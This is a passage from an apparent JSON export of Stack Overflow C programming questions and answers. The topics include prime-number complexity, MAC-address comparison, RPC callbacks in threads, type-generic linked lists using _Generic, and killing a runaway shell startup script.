numbers.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nvoid firstnprimes(int *a, int n){\n\n    if (n &lt; 1){\n        printf(\"INVALID\");\n        return;\n    }\n\n    int i = 0, j, k;                // i is the primes counter\n\n    for (j = 2; i != n; j++){       // j is a candidate number\n\n        for (k = 0; k &lt; i; k++)\n        {\n            if (j % a[k] == 0)      // a[k] is k-th prime\n                break;\n        }\n\n        if (k == i)                 // end-of-loop was reached\n            a[i++] = j;             // record the i-th prime, j\n    }\n    return;\n}\n\nint main(){\n    int n;\n    scanf_s(\"%d\",&amp;n);\n    int *a = (int *)malloc(n*sizeof(int));\n    firstnprimes(a,n);\n    for (int i = 0; i &lt; n; i++)\n        printf(\"%d\\n\",a[i]);\n    system(\"pause\");\n    return 0;\n}\n</code></pre>\n\n<p>My function's inner loop runs for <em>i</em> times (at the most), where <em>i</em> is the number of prime numbers below a given candidate number, and the outer loop runs for (<em>n</em>th prime number - <em>2</em>) times. </p>\n\n<p>How can I derive the complexity of this algorithm in Big O notation?</p>\n\n<p>Thanks in advance.</p>\n"}, {"tags": ["c", "arrays", "compare"], "comments": [{"owner": {"reputation": 5911, "user_id": 1688785, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/07b2da937aa23792045dff6ff19556eb?s=128&d=identicon&r=PG", "display_name": "Caramiriel", "link": "https://stackoverflow.com/users/1688785/caramiriel"}, "edited": false, "score": 0, "creation_date": 1498072331, "post_id": 44684410, "comment_id": 76352991, "body": "Related: <a href=\"https://stackoverflow.com/questions/3408706/hexadecimal-string-to-byte-array-in-c\" title=\"hexadecimal string to byte array in c\">stackoverflow.com/questions/3408706/&hellip;</a>"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1498072399, "post_id": 44684410, "comment_id": 76353035, "body": "Not cast but convert to a comparable format. C won&#39;t do it automatically for you."}, {"owner": {"reputation": 826, "user_id": 1715099, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/623042c376d81e406a14cfd5607b127c?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/1715099/alex"}, "edited": false, "score": 0, "creation_date": 1498072710, "post_id": 44684410, "comment_id": 76353207, "body": "If this doesn&#39;t work, then you will have to write your own function.  If &quot;00&quot; goes down to 0, then &quot;01:00:00&quot; will go down to &quot;100&quot;, and you&#39;ll have to distinguish it from &quot;01:00&quot; manually."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1498072920, "post_id": 44684410, "comment_id": 76353334, "body": "Read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> and provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. Don&#39;t write a novel to explain your code (or what you think your code does)."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498080192, "post_id": 44684410, "comment_id": 76357048, "body": "Should the compare &quot;00d5ff4l&quot; match &quot;00 D5 FF 41&quot;?  (case consideration)"}], "answers": [{"tags": [], "owner": {"reputation": 2024, "user_id": 1315171, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/081b87a82980b9c47ce10d65653ffe57?s=128&d=identicon&r=PG", "display_name": "Zakir", "link": "https://stackoverflow.com/users/1315171/zakir"}, "is_accepted": true, "score": 1, "last_activity_date": 1498075893, "creation_date": 1498075893, "answer_id": 44685452, "question_id": 44684410, "link": "https://stackoverflow.com/questions/44684410/compare-two-arrays-of-different-types/44685452#44685452", "title": "compare two arrays of different types", "body": "<p>Here's a little working utility function for you using <code>strncmp</code> </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint compare_mac() {\n    char mac[] = \"00d5ff4l\";    \n    char other_array[] = \"00:d5:ff:4l\"; //Will work for \"00 d5 ff 4l\" as well\n    int i = 0;\n    int j = 0;\n\n    //Bail out early for invalid inputs\n    if(strlen(other_array) - strlen(mac) !=3){\n        printf(\"Not Equal\");\n        return -1;        \n    }\n\n    while(i &lt; strlen(mac)){\n        if(strncmp(mac+i, other_array+j,2 ) !=0){\n            printf(\"Not Equal\");\n            return -1;\n        }\n        i=i+2;\n        j=j+3;\n    }\n    printf(\"Equal MAC IDs\");\n\n    return 0;\n}\n</code></pre>\n\n<p>Discalaimer:-  <code>strncmp</code> requires 2 non null pointers. The behavior is undefined when access occurs past the end of either array. The behavior is undefined when either param is a null pointer. So do adequate safety measures if you are taking the char arrays as in params to the function</p>\n"}, {"tags": [], "owner": {"reputation": 39, "user_id": 8186246, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/07177633babf8ad381e4e6e7f81fd3d1?s=128&d=identicon&r=PG", "display_name": "OVelychko", "link": "https://stackoverflow.com/users/8186246/ovelychko"}, "is_accepted": false, "score": 0, "last_activity_date": 1498107680, "creation_date": 1498107680, "answer_id": 44690491, "question_id": 44684410, "link": "https://stackoverflow.com/questions/44684410/compare-two-arrays-of-different-types/44690491#44690491", "title": "compare two arrays of different types", "body": "<p>I propose to use if statement only, because mac  adress will not changed for several years))\nJust create if() conditional for all 8 elements in array. It will be fastest solution without any conversion or loops.</p>\n"}], "owner": {"reputation": 262, "user_id": 7012495, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/qwO0V.jpg?s=128&g=1", "display_name": "idontknowwhoiamgodhelpme", "link": "https://stackoverflow.com/users/7012495/idontknowwhoiamgodhelpme"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 94, "favorite_count": 0, "accepted_answer_id": 44685452, "answer_count": 2, "score": 1, "last_activity_date": 1498107680, "creation_date": 1498072185, "question_id": 44684410, "link": "https://stackoverflow.com/questions/44684410/compare-two-arrays-of-different-types", "title": "compare two arrays of different types", "body": "<p>I want to compare to array. My problem is, that the first array is an array with this structure: <code>00d5ff4l</code> (a mac-address without colon).\nThe second array is from a buffer. His structure is <code>00 d5 ff 41</code> (Hex)</p>\n\n<p>My current code looks like this</p>\n\n<pre><code>char mac[] = \"00d5ff4l\";\nfor (int i = 0; i &lt; sizeof(mac); i++) {\n    if (mac[i] != other_array[i]) {\n        return 0;\n    }\n    else\n        return 1;\n}\n</code></pre>\n\n<p>Now is the problem the following: Index 1 of mac is '0', but for other_array it's '00'. So it will never match in this way. Do i have to cast one of them? If yes, how?</p>\n"}, {"tags": ["c", "multithreading", "winapi", "rpc"], "comments": [{"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1498073420, "post_id": 44684326, "comment_id": 76353617, "body": "Why create a thread when all you do in the creating thread is wait for the new thread to terminate?  Why not just call the exception-handler function directly?"}, {"owner": {"reputation": 326, "user_id": 7137867, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-FvVfZyScV4Q/AAAAAAAAAAI/AAAAAAAAADA/5-libN4cCck/photo.jpg?sz=128", "display_name": "Paul T", "link": "https://stackoverflow.com/users/7137867/paul-t"}, "reply_to_user": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1498073529, "post_id": 44684326, "comment_id": 76353682, "body": "This is the simplistic view. My code does more. If you ran this sample it would throw exception."}], "answers": [{"tags": [], "owner": {"reputation": 799, "user_id": 698679, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/7d8e7ba1c6d9226662788db8a1ada2b5?s=128&d=identicon&r=PG", "display_name": "alangab", "link": "https://stackoverflow.com/users/698679/alangab"}, "is_accepted": false, "score": 0, "last_activity_date": 1526454830, "creation_date": 1526454830, "answer_id": 50364525, "question_id": 44684326, "link": "https://stackoverflow.com/questions/44684326/how-to-call-a-callback-function-in-a-thread-from-microsoft-rpc-server/50364525#50364525", "title": "How to call a callback function in a thread from Microsoft RPC Server", "body": "<p>Maybe late, but I think the problem is that the information to call the callback is per thread. Every time you call a server, the server create a thread and it links the binding handle to that thread. If you add the fact you can call callback only during a client request, it is reasonable you can't call a callback in a thread different of that that wait on client request.</p>\n"}], "owner": {"reputation": 326, "user_id": 7137867, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-FvVfZyScV4Q/AAAAAAAAAAI/AAAAAAAAADA/5-libN4cCck/photo.jpg?sz=128", "display_name": "Paul T", "link": "https://stackoverflow.com/users/7137867/paul-t"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 429, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1526454830, "creation_date": 1498071928, "last_edit_date": 1498073098, "question_id": 44684326, "link": "https://stackoverflow.com/questions/44684326/how-to-call-a-callback-function-in-a-thread-from-microsoft-rpc-server", "title": "How to call a callback function in a thread from Microsoft RPC Server", "body": "<p>My server is trying to call an RPC Callback function from within a thread. Following the example <a href=\"https://support.microsoft.com/en-us/help/96781/how-to-use-rpc-callback-functions\" rel=\"nofollow noreferrer\">How To Use RPC Callback Functions\n</a> , and expanding slightly this is what I am attempting to do</p>\n\n<pre><code>   [ SAMPLE.IDL ]\n   [\n      uuid(9FEE4F51-0396-101A-AE4F-08002B2D0065),\n      version(1.0),\n      pointer_default( unique )\n   ]\n\n   {\n       void RPCProc( [in, string] unsigned char *pszStr );\n       [callback] void CallbackProc([in,string] unsigned char *pszStr);\n   }\n\n\n   [ SAMPLEC.C (Client)]\n     void CallbackProc( unsigned char *pszString )\n     {\n       printf(\"Call from server, printed on client: %s\", pszStr );\n     }\n\n\n   [ SAMPLES.C (Server)]\n     DWORD WINAPI thread(LPVOID lp)\n     {\n       CallbackProc(lp);\n       return 0;\n     }\n\n     void RPCProc( unsigned char *pszStr )\n     {\n       // WORKS\n       CallbackProc(pszStr);\n\n       // WORKS\n       thread(pszStr);\n\n       // Exception: 0x000006A6  binding handle invalid\n       HANDLE h = CreateThread(NULL, 0, thread, pszStr, 0, NULL);\n       WaitForSingleObject(h, INFINITE);\n     }\n</code></pre>\n\n<p>When CallbackProc is called from within a thread is when the exception is thrown.</p>\n"}, {"tags": ["c", "casting", "null-pointer"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 3, "creation_date": 1498072057, "post_id": 44684292, "comment_id": 76352825, "body": "I don&#39;t understand all this stuff about <i>null pointers</i> ... <code>0</code> evaluates to a null pointer of any type, as does <code>(void *)0</code> ... but as for the clearer question in the comment of your code: Not really, you have to come up with an own solution (like e.g. an <code>enum</code> for types you use). Type information in C isn&#39;t there any more once compiled, so there&#39;s no object of type &quot;type&quot;."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498072285, "post_id": 44684292, "comment_id": 76352960, "body": "Could use <code>void list_put_int(list *L, int *p) { .... xx.data = p; ...}</code> and <code>int *list_get_int(list *L) {   .... return xx.data;}</code>  yet as <a href=\"https://stackoverflow.com/questions/44684292/storing-and-casting-null-pointer-type-in-c#comment76352825_44684292\">@Felix Palmen</a> said, there&#39;s no object of type &quot;type&quot; and no cast that changes at run-time, (aside from maybe VLAs.and that would not help here anyways.)"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1498072565, "post_id": 44684292, "comment_id": 76353127, "body": "Code <i>could</i> use <code>_Generic</code> with a macro to achieve most of the goal.  Tis a bit convoluted."}, {"owner": {"reputation": 1678, "user_id": 1336484, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/43ed20a33c09665938a38f2a97f17b45?s=128&d=identicon&r=PG", "display_name": "LiamRyan", "link": "https://stackoverflow.com/users/1336484/liamryan"}, "edited": false, "score": 0, "creation_date": 1498072614, "post_id": 44684292, "comment_id": 76353152, "body": "@FelixPalmen You&#39;re right, sorry my brain dropped in null instead of void, updated the question"}], "answers": [{"tags": [], "owner": {"reputation": 18079, "user_id": 503402, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/873ad707fb34aac8fbdfbfec676e02e9?s=128&d=identicon&r=PG", "display_name": "Max", "link": "https://stackoverflow.com/users/503402/max"}, "is_accepted": false, "score": 0, "last_activity_date": 1498074632, "creation_date": 1498074632, "answer_id": 44685110, "question_id": 44684292, "link": "https://stackoverflow.com/questions/44684292/storing-and-using-type-information-in-c/44685110#44685110", "title": "Storing and using type information in C", "body": "<p>There is no way to do what you want in C. There is no way to store a type in a variable and C doesn't have a template system like C++ that would allow you to fake it in the preprocessor.</p>\n\n<p>You could define your own template-like macros that could quickly define your <code>node</code> and <code>list</code> structs for whatever type you need, but I think that sort of hackery is generally frowned upon unless you <em>really</em> need a whole bunch of linked lists that only differ in the type they store.</p>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 3, "creation_date": 1498075924, "post_id": 44685322, "comment_id": 76355022, "body": "<i>C does not provide any type safety</i> -- you don&#39;t really mean that? Probably you mean you have to sacrifice some type safety for type-generic code or something along those lines."}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1498076745, "post_id": 44685322, "comment_id": 76355413, "body": "@felixpalmen  some C compilers treat all data pointers as void*."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1498076952, "post_id": 44685322, "comment_id": 76355511, "body": "I wouldn&#39;t call such a thing a &quot;C compiler&quot;. Do you have an example for this broken behavior, that would allow to implicitly convert any data pointer type to any other?"}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1498077638, "post_id": 44685322, "comment_id": 76355821, "body": "@FelixPalmen <code>A a; B* b; void* p = &amp;a; b=p;</code>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1498077736, "post_id": 44685322, "comment_id": 76355874, "body": "<code>void *</code> is the <i>generic</i> pointer type. See my first comment. And in fact, what you outline here is very likely undefined behavior. What I don&#39;t see is a compiler &quot;<i>treating all data pointers as void*</i>&quot;. All data pointers are implicitly convertible from/to <code>void *</code>, as per the standard."}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1498078109, "post_id": 44685322, "comment_id": 76356078, "body": "If that was UB, every non-casted call to malloc() and free() would lead to undefined behaviour.  It could lead to UB if A and B are <i>binary incompatible</i>.  In any case, it demonstrates that C does not provide type safety.  Which is something someone coming from the Java world, as the OP states, should be aware of."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1498078701, "post_id": 44685322, "comment_id": 76356392, "body": "You&#39;re wrong. It leads to UB <i>as soon</i> as A and B aren&#39;t compatible types, and the rules for compatible types are quite narrow."}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1498081710, "post_id": 44685322, "comment_id": 76357634, "body": "You&#39;re wrong.  Code similar to what I describe in my comment is widely used in the C world. If in doubt, have a close look at any posix socket implementation."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1498107617, "post_id": 44685322, "comment_id": 76364377, "body": "The POSIX socket API is the best example of widespread ill-defined C. Just because people use it doesn&#39;t make it correct. Sure, assigning your pointers as shown above isn&#39;t UB yet, <i>accessing</i> the object most certainly <i>is</i>: C11 &#167;6.5.16.1 -- 3 &quot;<i>If the value being stored in an object is read from another object that overlaps in any way the storage of the first object, then the overlap shall be exact and the two objects shall have qualified or unqualified versions of a compatible type; otherwise, the behavior is undefined.</i>&quot; -- still no relation to your false claim about type safety in C."}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1498118559, "post_id": 44685322, "comment_id": 76370231, "body": "Keep in mind that the c89 standard was made so that sockets would still compile and you&#39;ll understand c."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1498118750, "post_id": 44685322, "comment_id": 76370361, "body": "There&#39;s no such thing as c98, you probably mean c89. Sockets code of course compiles, but you have to be <i>very</i> careful with aliasing pointers, you can <i>easily</i> invoke UB with this mess. And of course, code invoking UB compiles as well. <i>You</i> should try to &quot;understand C&quot;, and your claim <i>C does not provide any type safety</i> is just plain wrong."}], "tags": [], "owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "is_accepted": false, "score": -1, "last_activity_date": 1498077010, "last_edit_date": 1498077010, "creation_date": 1498075412, "answer_id": 44685322, "question_id": 44684292, "link": "https://stackoverflow.com/questions/44684292/storing-and-using-type-information-in-c/44685322#44685322", "title": "Storing and using type information in C", "body": "<p>Unlike Java or C++, C does not provide any type safety.  To answer your question succinctly, by rearranging your node type this way:</p>\n\n<pre><code>struct node {\n   node* prev;  /* put these at front */\n   node* next;\n   /* no data here */\n};\n</code></pre>\n\n<p>You could then separately declare nodes carrying any data</p>\n\n<pre><code>struct data_node {.\n    data_node *prev;            // keep these two data members at the front \n    data_node *next;            // and in the same order as in struct list.\n\n    // you can add more data members here.\n};\n/* OR... */\nenter code here\nstruct data_node2 {\n  node node_data;    /* WANING: this may look a bit safer, but is _only_ if placed at the front.\n  /*  more data ... */\n};\n</code></pre>\n\n<p>You can then create a library that operates on data-less lists of <code>node</code>s. </p>\n\n<pre><code>void list_add(list* l, node* n);\nvoid list_remove(list* l, node* n);\n/* etc... */\n</code></pre>\n\n<p>And by casting, use this 'generic lists' api to do operation on your list</p>\n\n<p>You can have some sort of type information in your list declaration, for what it's worth, since C does not provide meaningful type protection.</p>\n\n<pre><code>struct data_list\n{\n  data_node* head;    /* this makes intent clear. */\n  data_node* tail;\n};\n\nstruct data2_list\n{\n  data_node2* head;\n  data_node2* tail;\n};\n\n/* ... */\n\ndata_node* my_data_node = malloc(sizeof(data_node));\ndata_node2* my_data_node2 = malloc(sizeof(data_node2));\n\n/* ... */\n\nlist_add((list*)&amp;my_list, (node*)my_data_node); \nlist_add((list*)&amp;my_list2, &amp;(my_data_node2-&gt;node_data)); \n\n/* warning above is because one could write this */\nlist_add((list*)&amp;my_list2, (node*)my_data_node2); \n\n\n/* etc... */\n</code></pre>\n\n<p>These two techniques generate the same object code, so which one you choose is up to you, really.</p>\n\n<p>As an aside, avoid the typedef struct notation if your compiler allows, most compilers do, these days.  It increases readability in the long run, IMHO. You can be certain some won't and some will agree with me on this subject though.</p>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": false, "score": 0, "last_activity_date": 1498075851, "creation_date": 1498075851, "answer_id": 44685442, "question_id": 44684292, "link": "https://stackoverflow.com/questions/44684292/storing-and-using-type-information-in-c/44685442#44685442", "title": "Storing and using type information in C", "body": "<p>C doesn't have any runtime type information and doesn't have a type \"Type\". Types are meaningless once the code was compiled. So, there's no solution to what you ask <em>provided by the language</em>.</p>\n\n<p>One common reason you would want to have a type available at runtime is that you have some code that might see different instances of your container and must do different things for different types stored in the container. You can easily solve such a situation using an <code>enum</code>, e.g.</p>\n\n<pre><code>enum ElementType\n{\n    ET_INT; // int\n    ET_DOUBLE; // double\n    ET_CAR; // struct Car\n    // ...\n };\n</code></pre>\n\n<p>and enumerate any type here that should ever go into your container. Another reason is if your container should take ownership of the objects stored in it and therefore must know how to destroy them (and sometimes how to clone them). For such cases, I recommend the use of function pointers:</p>\n\n<pre><code>typedef void (*ElementDeleter)(void *element);\ntypedef void *(*ElementCloner)(const void *element);\n</code></pre>\n\n<p>Then extend your struct to contain these:</p>\n\n<pre><code>typedef struct list {\n    node *head;\n    node *tail;\n    ElementDeleter deleter;\n    ElementCloner cloner;\n} list;\n</code></pre>\n\n<p>Make sure they are set to a function that actually deletes resp. clones an element of the type to be stored in your container and then use them where needed, e.g. in a remove function, you could do something like</p>\n\n<pre><code>myList-&gt;deleter(myNode-&gt;data);\n// delete the contained element without knowing its type\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 2, "last_activity_date": 1498077334, "last_edit_date": 1498077334, "creation_date": 1498076399, "answer_id": 44685576, "question_id": 44684292, "link": "https://stackoverflow.com/questions/44684292/storing-and-using-type-information-in-c/44685576#44685576", "title": "Storing and using type information in C", "body": "<p>Typically, the use of specific functions like the following are used.</p>\n\n<pre><code>void    List_Put_int(list *L, int *i);\nvoid    List_Put_double(list *L, double *d);\nint *   List_Get_int(list *L);\ndouble *List_Get_double(list *L);\n</code></pre>\n\n<hr>\n\n<p>A not so easy for learner approach uses <code>_Generic</code>. C11 offers <code>_Generic</code> which allows for code, at compile time, to be steered as desired based on type.</p>\n\n<p>The below offers basic code to save/fetch to 3 types of pointers.  The macros would need expansion for each new types.  <code>_Generic</code> does not allow 2 types listed that may be the same like  <code>unsigned *</code> and <code>size_t *</code>.  So there are are limitations.  </p>\n\n<p>The <code>type_id(X)</code> macros creates an enumeration for the 3 types which may be use to check for run-time problems as with <code>LIST_POP(L, &amp;d);</code> below.</p>\n\n<pre><code>typedef struct node {\n  void *data;\n  int type;\n} node;\n\ntypedef struct list {\n  node *head;\n  node *tail;\n} list;\n\nnode node_var;\nvoid List_Push(list *l, void *p, int type) {\n  // tbd code - simplistic use of global for illustration only\n  node_var.data = p;\n  node_var.type = type;\n}\n\nvoid *List_Pop(list *l, int type) {\n  // tbd code\n  assert(node_var.type == type);\n  return node_var.data;\n}\n\n#define cast(X,ptr) _Generic((X), \\\n  double *: (double *) (ptr), \\\n  unsigned *: (unsigned *) (ptr), \\\n  int *: (int *) (ptr) \\\n  )\n\n#define type_id(X) _Generic((X), \\\n  double *: 1, \\\n  unsigned *: 2, \\\n  int *: 3 \\\n  )\n\n#define LIST_PUSH(L, data)  { List_Push((L),(data), type_id(data)); }\n#define LIST_POP(L, dataptr) (*(dataptr)=cast(*dataptr, List_Pop((L), type_id(*dataptr))) )\n</code></pre>\n\n<p>Usage example and output</p>\n\n<pre><code>int main() {\n  list *L = 0; // tbd initialization\n  int i = 42;\n  printf(\"%p %d\\n\", (void*) &amp;i, i);\n  LIST_PUSH(L, &amp;i);\n  int *j;\n  LIST_POP(L, &amp;j);\n  printf(\"%p %d\\n\", (void*) j, *j);\n  double *d;\n  LIST_POP(L, &amp;d);\n}\n\n42\n42\nassertion error\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 39, "user_id": 8186246, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/07177633babf8ad381e4e6e7f81fd3d1?s=128&d=identicon&r=PG", "display_name": "OVelychko", "link": "https://stackoverflow.com/users/8186246/ovelychko"}, "is_accepted": false, "score": 0, "last_activity_date": 1498076559, "creation_date": 1498076559, "answer_id": 44685610, "question_id": 44684292, "link": "https://stackoverflow.com/questions/44684292/storing-and-using-type-information-in-c/44685610#44685610", "title": "Storing and using type information in C", "body": "<p>create enum type, that will store data type and alloc memory according to this enum. This could be done in switch/case construction.</p>\n"}], "owner": {"reputation": 1678, "user_id": 1336484, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/43ed20a33c09665938a38f2a97f17b45?s=128&d=identicon&r=PG", "display_name": "LiamRyan", "link": "https://stackoverflow.com/users/1336484/liamryan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 127, "favorite_count": 0, "accepted_answer_id": 44685576, "answer_count": 5, "score": 1, "last_activity_date": 1498115766, "creation_date": 1498071829, "last_edit_date": 1498076485, "question_id": 44684292, "link": "https://stackoverflow.com/questions/44684292/storing-and-using-type-information-in-c", "title": "Storing and using type information in C", "body": "<p>I'm coming from Java and I'm trying to implement a doubly linked list in C as an exercise. I wanted to do something like the Java generics where I would pass a pointer type to the list initialization and this pointer type would be use to cast the list void pointer but I'm not sure if this is possible? </p>\n\n<p>What I'm looking for is something that can be stored in a list struct and used to cast *data to the correct type from a node. I was thinking of using a double pointer but then I'd need to declare that as a void pointer and I'd have the same problem.</p>\n\n<pre><code>typedef struct node {\n    void *data;\n    struct node *next;\n    struct node *previous;\n} node;\n\ntypedef struct list {\n    node *head;\n    node *tail;\n   //??? is there any way to store the data type of *data? \n} list;\n</code></pre>\n"}, {"tags": ["c", "command", "kill", "ctrl"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1498071681, "post_id": 44684210, "comment_id": 76352584, "body": "You have some script running some broken stuff on a shell startup. Look and clean up the <code>.bashrc</code> and/or <code>.bash_profile</code>."}, {"owner": {"reputation": 1, "user_id": 8195299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6067caaf16de28c5fc08b6f62b5e0b7b?s=128&d=identicon&r=PG&f=1", "display_name": "Christine", "link": "https://stackoverflow.com/users/8195299/christine"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1498071858, "post_id": 44684210, "comment_id": 76352705, "body": "Sorry, I am not sure exactly how to do this. Can you help me with exactly which commands I should enter?"}, {"owner": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 2, "creation_date": 1498072297, "post_id": 44684210, "comment_id": 76352967, "body": "You might get an answer at <a href=\"https://unix.stackexchange.com\">Unix & Linux</a>."}, {"owner": {"reputation": 2361, "user_id": 7410358, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b241c8238988d25da76f83adf9071201?s=128&d=identicon&r=PG&f=1", "display_name": "Louis Langholtz", "link": "https://stackoverflow.com/users/7410358/louis-langholtz"}, "edited": false, "score": 2, "creation_date": 1498073335, "post_id": 44684210, "comment_id": 76353575, "body": "Have you tried <code>Ctrl-Z</code> followed by <code>kill -9 %1</code>? This assumes that you don&#39;t have any other jobs backgrounded and then force kills the script."}, {"owner": {"reputation": 1, "user_id": 8195299, 